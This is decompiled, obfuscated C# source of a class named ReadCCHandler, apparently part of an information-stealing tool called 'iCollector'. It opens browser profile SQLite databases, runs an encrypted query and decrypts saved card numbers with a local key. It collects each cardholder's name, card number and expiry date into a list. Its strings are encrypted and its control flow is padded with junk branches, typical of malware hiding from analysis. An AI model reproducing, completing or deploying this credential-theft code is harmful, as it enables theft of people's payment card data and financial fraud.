using System;
using System.Collections.Generic;
using iCollector.Job.Model;
using iCollector.Util;
using Microsoft.Data.Sqlite;

namespace iCollector.Job.Handler;

internal class ReadCCHandler
{
	private static string CLAZZ_NAME_SE;

	private static string CLAZZ_NAME;

	private static readonly string LOG_01_1_SE;

	private static readonly string LOG_01_1;

	private static readonly string LOG_02_1_SE;

	private static readonly string LOG_02_1;

	private static readonly string UNAME_SE;

	private static readonly string UNAME;

	private static readonly string NUMBER_SE;

	private static readonly string NUMBER;

	private static readonly string EXP_SE;

	private static readonly string EXP;

	private static readonly string EXPY_SE;

	private static readonly string EXPY;

	public static readonly string Q1_SE;

	public static readonly string Q1;

	private Logger log = Logger.Instance();

	private LogContext ctx = new LogContext(CLAZZ_NAME);

	public void Enrich(CKModel model)
	{
		if (model.Profiles == null)
		{
			return;
		}
		int num = model.Profiles.Count;
		List<CKProfile>.Enumerator enumerator2 = default(List<CKProfile>.Enumerator);
		CKProfile cKProfile = default(CKProfile);
		while (num != 0)
		{
			while (true)
			{
				List<CKProfile>.Enumerator enumerator = model.Profiles.GetEnumerator();
				if (8u != 0 && 0 == 0)
				{
					enumerator2 = enumerator;
				}
				try
				{
					while (true)
					{
						IL_00d1:
						int num2 = (enumerator2.MoveNext() ? 1 : 0);
						if (0 == 0)
						{
							while (num2 != 0)
							{
								while (true)
								{
									CKProfile current = enumerator2.Current;
									if (0 == 0 && 0 == 0)
									{
										cKProfile = current;
									}
									Logger logger = log;
									LogContext logContext = ctx;
									string message = LOG_01_1 + cKProfile.Path;
									if (2u != 0 && 7u != 0)
									{
										logger.Info(logContext, message);
									}
									CKProfile cKProfile2 = cKProfile;
									List<string> ccValues = new List<string>();
									if (0 == 0 && 3u != 0)
									{
										cKProfile2.CcValues = ccValues;
									}
									if (string.IsNullOrEmpty(cKProfile.CCPath))
									{
										break;
									}
									num2 = 0;
									if (num2 != 0)
									{
										goto IL_00db;
									}
									if (num2 != 0)
									{
										continue;
									}
									goto IL_0081;
								}
								goto IL_00d1;
								IL_00db:;
							}
							break;
						}
						goto IL_009e;
						IL_009e:
						Logger logger2 = log;
						LogContext logContext2 = ctx;
						string lOG_02_ = LOG_02_1;
						int count = cKProfile.CcValues.Count;
						int num3;
						if (uint.MaxValue != 0 && 5u != 0)
						{
							num3 = count;
						}
						string message2 = lOG_02_ + num3;
						if (0 == 0)
						{
							if (0 == 0)
							{
								logger2.Info(logContext2, message2);
							}
							if (false)
							{
							}
						}
						continue;
						IL_0081:
						num2 = (DataSourceHelper.ExecuteQuery(cKProfile.CCPath, Q1, CreateConsumer(model, cKProfile), 500) ? 1 : 0);
						goto IL_009e;
					}
				}
				finally
				{
					((IDisposable)enumerator2).Dispose();
				}
				num = 3;
				if (num == 0)
				{
					break;
				}
				if (num != 0)
				{
					return;
				}
			}
		}
	}

	private Consumer<SqliteDataReader>.Accept CreateConsumer(CKModel model, CKProfile profile)
	{
		CKModel model2 = model;
		CKProfile profile2 = profile;
		return delegate(SqliteDataReader reader)
		{
			string text = default(string);
			string text2 = default(string);
			string text3;
			string text5 = default(string);
			if (true)
			{
				string @string = reader.GetString(0);
				if (0 == 0 && 0 == 0)
				{
					text = @string;
				}
				do
				{
					string string2 = reader.GetString(1);
					if (uint.MaxValue != 0 && 0 == 0)
					{
						text2 = string2;
					}
					do
					{
						string string3 = reader.GetString(2);
						if ((3u != 0) ? true : false)
						{
							text3 = string3;
						}
					}
					while (7 == 0);
				}
				while (false);
				string text4 = WinAPI.ReadValue(DataSourceHelper.GetBytes(reader, 3), model2.LcsBytes, 3);
				if (3u != 0 && 0 == 0)
				{
					text5 = text4;
				}
			}
			string text6 = UNAME + text + NUMBER + text5 + EXP + text2 + EXPY + text3;
			string text7 = default(string);
			if (0 == 0 && 4u != 0)
			{
				text7 = text6;
			}
			List<string> ccValues = profile2.CcValues;
			string item = text7;
			if (5u != 0 && 0 == 0)
			{
				ccValues.Add(item);
			}
		};
	}

	static ReadCCHandler()
	{
		while (true)
		{
			CLAZZ_NAME_SE = "JLGL1W+oLB/3Hrz7dYgx2Q==.5l1IJ/oFHFWgG/13kfJM0C4Ke/zwjsB4tGkILQ02u78=";
			CLAZZ_NAME = SecurityUtils.ReadStructEncrypted(CLAZZ_NAME_SE);
			int num = 0;
			while (true)
			{
				if (num == 0)
				{
					LOG_01_1_SE = "FCnt8ErMVC9HZV6ycyU4Rw==.AjCPtML3AQcBTa0dwnpDK15/g4dZclwiyq737/T8LKbeFcjHxrk0HiVLqh3ApnX2";
					if (false)
					{
						break;
					}
					LOG_01_1 = SecurityUtils.ReadStructEncrypted(LOG_01_1_SE);
					while (true)
					{
						LOG_02_1_SE = "9E2Tf2ahGk+PojAG8Oac/g==.i6YpFoV4fh8oqRaBRbPiO8Oa1xQxNZ21sDiYWXHLFjE=";
						LOG_02_1 = SecurityUtils.ReadStructEncrypted(LOG_02_1_SE);
						num = 0;
						if (num != 0)
						{
							goto IL_00a0;
						}
						if (num != 0)
						{
							break;
						}
						if (num != 0)
						{
							continue;
						}
						if (0 == 0)
						{
							UNAME_SE = "RTzY1o6X5OHoocN5tG0eYg==.NVt9TZSiXXzVdgHPXblnXLAqVNuXH192bTNu49B4RfU=";
							do
							{
								UNAME = SecurityUtils.ReadStructEncrypted(UNAME_SE);
							}
							while (7 == 0);
							NUMBER_SE = "Ci9t5YasqWYk6w3xUkeimw==.lqAcvGNaAbqH+A6f9tWXDkb89blQlRTTKd3s9dA6SzI=";
							NUMBER = SecurityUtils.ReadStructEncrypted(NUMBER_SE);
							goto IL_0095;
						}
						goto IL_00a2;
						IL_00a0:
						if (num != 0)
						{
							goto IL_0095;
						}
						goto IL_00a2;
						IL_0095:
						EXP_SE = "Y9XSHlGqQ3xAeSgRkNqt8g==.GPUpzUoyX2YmbEm8ivveklo5c6oFNLcWv6K10t2dmbho2oogkr9730dBl9a+21R6";
						num = 0;
						goto IL_00a0;
					}
					continue;
				}
				goto IL_00ca;
				IL_00ca:
				Q1_SE = "2wvK1CH13l/1qSyCOkymYw==.KA81Ey5+0bMBpoB4eHZ2tocHtS8dyvwuLT6NceDjxc+q8G4q7x/kg5HniERAWWt6NzRg3hx6n4n2VLq4IHSPMGbKNdUVF6nMWmYCLX+jJqclhlKCAOTK1o2xUCPvpFIyYrRvB0EixRKe5/UfwxadMA==";
				Q1 = SecurityUtils.ReadStructEncrypted(Q1_SE);
				return;
				IL_00a2:
				EXP = SecurityUtils.ReadStructEncrypted(EXP_SE);
				EXPY_SE = "SVgWOhxN0v24iwckPMqFuw==.W4hyo/lGxZZGSB829bMo207SqZLGWDM6ODhTQaC/1GY=";
				EXPY = SecurityUtils.ReadStructEncrypted(EXPY_SE);
				goto IL_00ca;
			}
		}
	}
}
